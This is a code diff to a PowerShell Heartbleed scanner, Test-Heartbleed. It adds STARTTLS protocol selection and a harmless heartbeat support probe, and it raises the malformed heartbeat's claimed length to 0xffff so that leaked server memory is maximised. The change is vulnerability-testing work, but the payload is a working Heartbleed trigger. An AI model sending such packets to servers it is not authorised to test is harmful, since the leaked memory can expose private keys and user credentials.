@@ -120,10 +120,12 @@ function Test-Heartbleed
         
         [Parameter(
             HelpMessage="Enable to send the plaintext STARTTLS command.")]
-            [switch]$STARTTLS=$false
+            [ValidateSet("FTP","IMAP","POP","SMTP","NONE")]
+            [string]$STLSProto="NONE"
     )
     Begin
     {
+        # TLS V1.1 right now
         $tls_clienthello = [Byte[]] (
         0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
         0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
@@ -141,7 +143,13 @@ function Test-Heartbleed
         0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
         0x01)
 
-        $heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 )
+        # 32 byte heartbeat request
+        $safe_heartbeat = [Byte[]] (
+        0x18, 0x03, 0x02, 0x00, 0x20 + (,0x11 * 32) + `
+        0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x00, 0x00
+        )
+        
+        $evil_heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0xff, 0xff )
     }
 
     Process
@@ -173,14 +181,14 @@ function Test-Heartbleed
                     $stream = $tcp.GetStream()
 
                     # send starttls if we need to
-                    if ($STARTTLS) 
+                    if ($STLSProto -ne "NONE") 
                     {
                         # any bytes waiting?  read them...
                         $awh = $stream.BeginRead($response,0,$response.Length,$null,$null)
                         $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                         $n = $stream.EndRead($awh)
 
-                        if ($Port -eq 21)
+                        if ($STLSProto -eq "FTP")
                         {
                             $cmd = [System.Text.Encoding]::UTF8.GetBytes("AUTH TLS`r`n")
                             $stream.Write($cmd,0,$cmd.Length)
@@ -191,7 +199,7 @@ function Test-Heartbleed
                                 break
                             }
                         }
-                        elseif ($Port -eq 25)
+                        elseif ($STLSProto -eq "SMTP")
                         {
                             $cmd = [System.Text.Encoding]::UTF8.GetBytes("EHLO testhost`r`n")
                             $stream.Write($cmd,0,$cmd.Length)
@@ -205,7 +213,7 @@ function Test-Heartbleed
                             $stream.Write($cmd,0,$cmd.Length)
                             $n = $stream.Read($response,0,$response.length)
                         }
-                        elseif ($port -eq 110)
+                        elseif ($STLSProto -eq "POP")
                         {
                             $cmd = [System.Text.Encoding]::UTF8.GetBytes("CAPA`r`n")
                             $stream.Write($cmd,0,$cmd.Length)
@@ -219,7 +227,7 @@ function Test-Heartbleed
                             $stream.Write($cmd,0,$cmd.Length)
                             $n = $stream.Read($response,0,$response.length)
                         }
-                        elseif ($port -eq 143)
+                        elseif ($STLSProto -eq "IMAP")
                         {
                             $cmd = [System.Text.Encoding]::UTF8.GetBytes("A1 CAPABILITY`r`n")
                             $stream.Write($cmd,0,$cmd.Length)
@@ -246,10 +254,25 @@ function Test-Heartbleed
                         Throw [System.Exception] "Malformed TLS Server Hello"
                     }
 
+                    # test if heartbeat is supported
+                    if ($nt -eq 0)
+                    {
+                        Write-Verbose -Message "Sending Heartbeat support test packet"
+                        $stream.Write($safe_heartbeat,0,$safe_heartbeat.Length)
+                        $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
+                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                        if(!$wait) 
+                        {
+                            Write-Verbose -Message "$($computer) does not support TLS heartbeat."
+                            $vulnerable = $false
+                            break
+                        }
+                    }
+
                     Write-Verbose -Message "Sending $($Heartbeats) TLS heartbeat packets"
                     for ($i=0; $i -lt $Heartbeats; $i++) 
                     {
-                        $stream.Write($heartbeat,0,$heartbeat.Length)
+                        $stream.Write($evil_heartbeat,0,$evil_heartbeat.Length)
 
                         $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
                         $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
